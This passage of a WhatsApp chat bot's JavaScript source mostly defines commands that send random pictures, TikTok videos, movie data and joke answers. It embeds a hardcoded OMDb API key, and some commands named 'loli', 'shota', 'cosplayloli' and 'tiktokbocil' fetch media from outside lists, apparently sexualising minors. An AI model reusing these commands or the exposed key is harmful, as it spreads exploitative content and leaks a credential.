              await fs.promises.writeFile(audioFilePath, audioBuffer);
            } catch (writeError) {
              console.error("Error writing audio file:", writeError);
              return replygcXlicon("Error writing audio file");
            }
            let doc = {
              audio: {
                url: audioFilePath,
              },
              mimetype: "audio/mpeg",
              ptt: true,
              waveform: [100, 0, 100, 0, 100, 0, 100],
              fileName: "SalmanSer",
              contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                  title: `PLAYING TO ${name}`,
                  body: botname,
                  thumbnailUrl: coverimage,
                  sourceUrl: websitex,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            };
            await XliconBotInc.sendMessage(m.chat, doc, { quoted: m });
          } catch (error) {
            console.error("Error fetching Spotify data:", error);
            return replygcXlicon("*Error*");
          }
        }
        break;
      case "imdb":
        if (!text) return replygcXlicon(`_Name a Series or movie`);
        await XliconStickWait();
        let fids = await axios.get(
          `http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`
        );
        let imdbt = "";
        console.log(fids.data);
        imdbt +=
          "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";
        imdbt += "🎬Title      : " + fids.data.Title + "\n";
        imdbt += "📅Year       : " + fids.data.Year + "\n";
        imdbt += "⭐Rated      : " + fids.data.Rated + "\n";
        imdbt += "📆Released   : " + fids.data.Released + "\n";
        imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n";
        imdbt += "🌀Genre      : " + fids.data.Genre + "\n";
        imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n";
        imdbt += "✍Writer     : " + fids.data.Writer + "\n";
        imdbt += "👨Actors     : " + fids.data.Actors + "\n";
        imdbt += "📃Plot       : " + fids.data.Plot + "\n";
        imdbt += "🌐Language   : " + fids.data.Language + "\n";
        imdbt += "🌍Country    : " + fids.data.Country + "\n";
        imdbt += "🎖️Awards     : " + fids.data.Awards + "\n";
        imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n";
        imdbt += "🏙️Production : " + fids.data.Production + "\n";
        imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n";
        imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + "";
        XliconBotInc.sendMessage(
          m.chat,
          {
            image: {
              url: fids.data.Poster,
            },
            caption: imdbt,
          },
          {
            quoted: m,
          }
        );
        break;
      case "ebinary":
        {
          if (!q)
            return replygcXlicon(
              `Send/reply text with captions ${prefix + command}`
            );
          let { eBinary } = require("./lib/binary");
          let eb = await eBinary(`${q}`);
          replygcXlicon(eb);
        }
        break;
      case "dbinary":
        {
          if (!q)
            return replygcXlicon(
              `Send/reply text with captions ${prefix + command}`
            );
          let { dBinary } = require("./lib/binary");
          let db = await dBinary(`${q}`);
          replygcXlicon(db);
        }
        break;
      case "happymod":
        {
          if (!q)
            return replygcXlicon(
              `Example ${prefix + command} Sufway surfer mod`
            );
          await XliconStickWait();
          let kat = await scp2.happymod(q);
          replygcXlicon(util.format(kat));
        }
        break;
      case "gdrive":
        {
          if (!args[0]) return replygcXlicon(`Enter the Google Drive link`);
          await XliconStickWait();
          const fg = require("api-dylux");
          try {
            let res = await fg.GDriveDl(args[0]);
            await replygcXlicon(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`);
            XliconBotInc.sendMessage(
              m.chat,
              {
                document: { url: res.downloadUrl },
                fileName: res.fileName,
                mimetype: res.mimetype,
              },
              { quoted: m }
            );
          } catch {
            replygcXlicon("Error: Check link or try another link");
          }
        }
        break;
      case "pinterest":
        {
          if (!text) return replygcXlicon(`Enter Query`);
          let { pinterest } = require("./lib/scraper");
          anutrest = await pinterest(text);
          result = anutrest[Math.floor(Math.random() * anutrest.length)];
          XliconBotInc.sendMessage(
            m.chat,
            { image: { url: result }, caption: "⭔ Media Url : " + result },
            { quoted: m }
          );
        }
        break;
      case "ringtone":
        {
          if (!text)
            return replygcXlicon(`Example : ${prefix + command} black rover`);
          let ringtone = require("./lib/scraper");
          let anutone2 = await ringtone.ringtone(text);
          let result = anutone2[Math.floor(Math.random() * anutone2.length)];
          XliconBotInc.sendMessage(
            m.chat,
            {
              audio: { url: result.audio },
              fileName: result.title + ".mp3",
              mimetype: "audio/mpeg",
            },
            { quoted: m }
          );
        }
        break;
      case "tiktokgirl":
        await XliconStickWait();
        var asupan = JSON.parse(
          fs.readFileSync("./src/media/tiktokvids/tiktokgirl.json")
        );
        var hasil = pickRandom(asupan);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokghea":
        await XliconStickWait();
        var gheayubi = JSON.parse(
          fs.readFileSync("./src/media/tiktokvids/gheayubi.json")
        );
        var hasil = pickRandom(gheayubi);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokbocil":
        await XliconStickWait();
        var bocil = JSON.parse(
          fs.readFileSync("./src/media/tiktokvids/bocil.json")
        );
        var hasil = pickRandom(bocil);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktoknukhty":
        await XliconStickWait();
        var ukhty = JSON.parse(
          fs.readFileSync("./src/media/tiktokvids/ukhty.json")
        );
        var hasil = pickRandom(ukhty);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktoksantuy":
        await XliconStickWait();
        var santuy = JSON.parse(
          fs.readFileSync("./src/media/tiktokvids/santuy.json")
        );
        var hasil = pickRandom(santuy);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokkayes":
        await XliconStickWait();
        var kayes = JSON.parse(
          fs.readFileSync("./src/media/tiktokvids/kayes.json")
        );
        var hasil = pickRandom(kayes);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokpanrika":
        await XliconStickWait();
        var rikagusriani = JSON.parse(
          fs.readFileSync("./src/media/tiktokvids/panrika.json")
        );
        var hasil = pickRandom(rikagusriani);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktoknotnot":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokvids/notnot.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "chinese":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/china.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "hijab":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/hijab.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "indo":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/indonesia.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "japanese":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/japan.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "korean":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/korea.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "malay":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/malaysia.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "randomgirl":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/random.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "randomboy":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/random2.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "thai":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/thailand.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "vietnamese":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/vietnam.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "aesthetic":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/aesthetic.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "antiwork":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/antiwork.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "blackpink":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/blackpink.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "bike":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/bike.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "boneka":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/boneka.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "cosplay":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/cosplay.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "cat":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/cat.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "doggo":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/doggo.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "justina":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/justina.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "kayes":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/kayes.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "kpop":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/kpop.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "notnot":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/notnot.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "car":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/car.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "couplepp":
      case "ppcouple":
        {
          let anu = require("./src/media/randompics/ppcouple.json");
          let random = anu[Math.floor(Math.random() * anu.length)];
          XliconBotInc.sendMessage(
            from,
            { image: { url: random.male }, caption: `Couple pp for male` },
            { quoted: m }
          );
          XliconBotInc.sendMessage(
            from,
            { image: { url: random.female }, caption: `Couple pp for female` },
            { quoted: m }
          );
        }
        break;
      case "profilepic":
      case "profilepicture":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/profile.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "pubg":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/pubg.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "rose":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/rose.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "ryujin":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/ryujin.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "ulzzangboy":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/ulzzangboy.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "ulzzanggirl":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/ulzzanggirl.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "wallml":
      case "wallpaperml":
      case "mobilelegend":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/wallml.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "wallpaperphone":
      case "wallphone":
        await XliconStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/randompics/wallhp.json")
        );
        var hasil = pickRandom(notnot);
        XliconBotInc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "remini":
        {
          if (!quoted) return replygcXlicon(`Where is the picture?`);
          if (!/image/.test(mime))
            return replygcXlicon(
              `Send/Reply Photos With Captions ${prefix + command}`
            );
          await XliconStickWait();
          const { remini } = require("./lib/remini");
          let media = await quoted.download();
          let proses = await remini(media, "enhance");
          XliconBotInc.sendMessage(
            m.chat,
            { image: proses, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "define":
        if (!q) return replygcXlicon(`What do you want to define?`);
        try {
          targetfine = await axios.get(
            `http://api.urbandictionary.com/v0/define?term=${q}`
          );
          if (!targetfine) return replygcXlicon(mess.error);
          const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
            .replace(/\[/g, "")
            .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
            .replace(/\[/g, "")
            .replace(/\]/g, "")}`;
          XliconBotInc.sendMessage(m.chat, { text: reply }, { quoted: m });
        } catch (err) {
          console.log(err);
          return replygcXlicon(`*${q}* isn't a valid text`);
        }
        break;
      case "can":
        {
          if (!text)
            return replygcXlicon(
              `Ask question\n\nExample : ${prefix + command} i dance?`
            );
          let bisa = [`Can`, `Can't`, `Cannot`, `Of Course You Can!!!`];
          let keh = bisa[Math.floor(Math.random() * bisa.length)];
          let jawab = `*Can ${text}*\nAnswer : ${keh}`;
          await replygcXlicon(jawab);
        }
        break;
      case "is":
        {
          if (!text)
            return replygcXlicon(
              `Ask question\n\nExample : ${prefix + command} she virgin?`
            );
          let apa = [`Yes`, `No`, `It Could Be`, `Thats right`];
          let kah = apa[Math.floor(Math.random() * apa.length)];
          let jawab = `*Is ${text}*\nAnswer : ${kah}`;
          await replygcXlicon(jawab);
        }
        break;
      case "when":
        {
          if (!text)
            return replygcXlicon(
              `Ask question\n\nExample : ${
                prefix + command
              } will i get married?`
            );
          let kapan = [
            "5 More Days",
            "10 More Days",
            "15 More Days",
            "20 More Days",
            "25 More Days",
            "30 More Days",
            "35 More Days",
            "40 More Days",
            "45 More Days",
            "50 More Days",
            "55 More Days",
            "60 More Days",
            "65 More Days",
            "70 More Days",
            "75 More Days",
            "80 More Days",
            "85 More Days",
            "90 More Days",
            "100 More Days",
            "5 Months More",
            "10 Months More",
            "15 Months More",
            "20 Months More",
            "25 Months More",
            "30 Months More",
            "35 Months More",
            "40 Months More",
            "45 Months More",
            "50 Months More",
            "55 Months More",
            "60 Months More",
            "65 Months More",
            "70 Months More",
            "75 Months More",
            "80 Months More",
            "85 Months More",
            "90 Months More",
            "100 Months More",
            "1 More Year",
            "2 More Years",
            "3 More Years",
            "4 More Years",
            "5 More Years",
            "Tomorrow",
            "The Day After Tomorrow",
          ];
          let koh = kapan[Math.floor(Math.random() * kapan.length)];
          let jawab = `*${command} ${text}*\nAnswer : ${koh}`;
          await replygcXlicon(jawab);
        }
        break;
      case "what":
        {
          if (!text)
            return replygcXlicon(
              `Ask question\n\nExample : ${prefix + command} is your name?`
            );
          let lel = [
            `Ask Your Gf`,
            `I Dont Know`,
            `I Don't Know, Ask Your Father`,
          ];
          let kah = lel[Math.floor(Math.random() * lel.length)];
          let jawab = `*What ${text}*\nAnswer : ${kah}`;
          await replygcXlicon(jawab);
        }
        break;
      case "where":
        {
          if (!text)
            return replygcXlicon(
              `Ask question\n\nExample : ${prefix + command} is my ex?`
            );
          let wherelol = [
            `In the mountain`,
            `On mars`,
            `On moon`,
            `In the jungle`,
            `I dont know ask your mom`,
            `It could be somewhere`,
          ];
          let kah = wherelol[Math.floor(Math.random() * wherelol.length)];
          let jawab = `*Where ${text}*\nAnswer : ${kah}`;
          await replygcXlicon(jawab);
        }
        break;
      case "how":
        {
          if (!text)
            return replygcXlicon(
              `Ask question\n\nExample : ${prefix + command} to date girl?`
            );
          let gimana = [
            `Ummm...`,
            `It's Difficult Bro`,
            `Sorry Bot Can't Answer`,
            `Try Searching On Google`,
            `Holy Cow! Really???`,
            `Dizzy Ah😴, don't wanna answer`,
            `Ohhh I See:(`,
            `The Patient, Boss:(`,
            `Really dude 🙄`,
          ];
          let kah = gimana[Math.floor(Math.random() * gimana.length)];
          let jawab = `*How ${text}*\nAnswer : ${kah}`;
          await replygcXlicon(jawab);
        }
        break;
      case "rate":
        {
          if (!text)
            return replygcXlicon(`Example : ${prefix + command} my profile`);
          let kah = getRandomNumber(0, 100);
          let jawab = `*Rate ${text}*\nAnswer : ${kah}%`;
          await replygcXlicon(jawab);
        }
        break;
      case "runtime":
        {
          let lowq = `*The Bot Has Been Online For:*\n*${runtime(
            process.uptime()
          )}*`;
          replygcXlicon(lowq);
        }
        break;
      case "soulmate":
        {
          if (!m.isGroup) return XeonStickGroup();
          let member = participants.map((u) => u.id);
          let me = m.sender;
          let jodoh = member[Math.floor(Math.random() * member.length)];
          XliconBotInc.sendMessage(
            m.chat,
            {
              text: `👫Your Soulmate Is

@${me.split("@")[0]} ❤️ @${jodoh.split("@")[0]}`,
              contextInfo: {
                mentionedJid: [me, jodoh],
                forwardingScore: 9999999,
                isForwarded: true,
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  previewType: "PHOTO",
                  thumbnailUrl: ``,
                  thumbnail: fs.readFileSync(
                    `./XliconMedia/theme/xliconpic.jpg`
                  ),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "couple":
        {
          if (!m.isGroup) return XeonStickGroup();
          let member = participants.map((u) => u.id);
          let orang = member[Math.floor(Math.random() * member.length)];
          let jodoh = member[Math.floor(Math.random() * member.length)];
          XliconBotInc.sendMessage(
            m.chat,
            {
              text: `@${orang.split("@")[0]} ❤️ @${jodoh.split("@")[0]}
Cieeee, What's Going On❤️💖👀`,
              contextInfo: {
                mentionedJid: [orang, jodoh],
                forwardingScore: 9999999,
                isForwarded: true,
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  previewType: "PHOTO",
                  thumbnailUrl: ``,
                  thumbnail: fs.readFileSync(
                    `./XliconMedia/theme/xliconpic.jpg`
                  ),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "coffee":
      case "kopi":
        {
          XliconBotInc.sendMessage(
            m.chat,
            {
              caption: mess.success,
              image: { url: "https://coffee.alexflipnote.dev/random" },
            },
            { quoted: m }
          );
        }
        break;
      case "wallpaper":
        {
          if (!text) return replygcXlicon("Enter Query Title");
          await XliconStickWait();
          let { wallpaper } = require("./lib/scraper");
          anuwallpep = await wallpaper(text);
          result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)];
          XliconBotInc.sendMessage(
            m.chat,
            {
              caption: `${themeemoji} Title : ${
                result.title
              }\n${themeemoji} Category : ${
                result.type
              }\n${themeemoji} Detail : ${
                result.source
              }\n${themeemoji} Media Url : ${
                result.image[2] || result.image[1] || result.image[0]
              }`,
              image: { url: result.image[0] },
            },
            { quoted: m }
          );
        }
        break;
      case "wikimedia":
        {
          if (!text) return replygcXlicon("Enter Query Title");
          await XliconStickWait();
          let { wikimedia } = require("./lib/scraper");
          let anumedia = await wikimedia(text);
          result = anumedia[Math.floor(Math.random() * anumedia.length)];
          XliconBotInc.sendMessage(
            m.chat,
            {
              caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`,
              image: { url: result.image },
            },
            { quoted: m }
          );
        }
        break;

      case "random":
        {
          let type = command.toLowerCase();
          let baseUrl = "https://weeb-api.vercel.app/";
          const fetchImage = async (endpoint) => {
            try {
              const response = await fetch(baseUrl + endpoint);
              if (!response.ok)
                return replygcXlicon(`Error fetching ${type} image`);
              const imageBuffer = await response.buffer(); // Get the image data as a buffer
              XliconBotInc.sendMessage(
                m.chat,
                { image: imageBuffer, caption: `Random ${type}` },
                { quoted: m }
              );
            } catch (error) {
              console.error(error);
              replygcXlicon(
                `An error occurred while fetching the ${type} image. Please use the command properly \nExample: ${
                  prefix + command
                } loli\n`
              );
            }
          };
          switch (type) {
            case "loli":
              fetchImage("loli");
              break;
            case "waifu":
              fetchImage("waifu");
              break;
            case "neko":
              fetchImage("neko");
              break;
            case "zerotwo":
              fetchImage("zerotwo");
              break;
            default:
              break;
          }
        }
        break;
      case "akira":
      case "akiyama":
      case "ana":
      case "art":
      case "asuna":
      case "ayuzawa":
      case "boruto":
      case "bts":
      case "chiho":
      case "chitoge":
      case "cosplay":
      case "cosplayloli":
      case "cosplaysagiri":
      case "cyber":
      case "deidara":
      case "doraemon":
      case "elaina":
      case "emilia":
      case "erza":
      case "exo":
      case "gamewallpaper":
      case "gremory":
      case "hacker":
      case "hestia":
      case "husbu":
      case "inori":
      case "islamic":
      case "isuzu":
      case "itachi":
      case "itori":
      case "jennie":
      case "jiso":
      case "justina":
      case "kaga":
      case "kagura":
      case "kakasih":
      case "kaori":
      case "cartoon":
      case "shortquote":
      case "keneki":
      case "kotori":
      case "kurumi":
      case "lisa":
      case "loli":
      case "madara":
      case "megumin":
      case "mikasa":
      case "mikey":
      case "miku":
      case "minato":
      case "mountain":
      case "naruto":
      case "neko":
      case "neko2":
      case "nekonime":
      case "nezuko":
      case "onepiece":
      case "pentol":
      case "pokemon":
      case "programming":
      case "randomnime":
      case "randomnime2":
      case "rize":
      case "rose":
      case "sagiri":
      case "sakura":
      case "sasuke":
      case "satanic":
      case "shina":
      case "shinka":
      case "shinomiya":
      case "shizuka":
      case "shota":
      case "space":
      case "technology":
      case "tejina":
      case "toukachan":
      case "tsunade":
      case "waifu":
      case "yotsuba":
      case "yuki":
      case "yulibocil":
      case "yumeko":
        {
          await XliconStickWait();
          let heyy;
          if (/akira/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json"
            );
          if (/akiyama/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json"
            );
          if (/ana/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json"
            );
          if (/art/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json"
            );
          if (/asuna/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json"
            );
          if (/ayuzawa/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json"
            );
          if (/boneka/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json"
            );
          if (/boruto/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json"
            );
          if (/bts/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json"
            );
          if (/cecan/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json"
            );
          if (/chiho/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json"
            );
          if (/chitoge/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json"
            );
          if (/cogan/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json"
            );
          if (/cosplay/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json"
            );
          if (/cosplayloli/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json"
            );
          if (/cosplaysagiri/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json"
            );
          if (/cyber/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json"
            );
          if (/deidara/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json"
            );
          if (/doraemon/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json"
            );
          if (/eba/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json"
            );
          if (/elaina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json"
            );
          if (/emilia/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json"
            );
          if (/erza/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json"
            );
          if (/exo/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json"
            );
          if (/femdom/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json"
            );
          if (/freefire/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json"
            );
          if (/gamewallpaper/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json"
            );
          if (/glasses/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json"
            );
          if (/gremory/.test(command))
            heyy = await fetchJson(
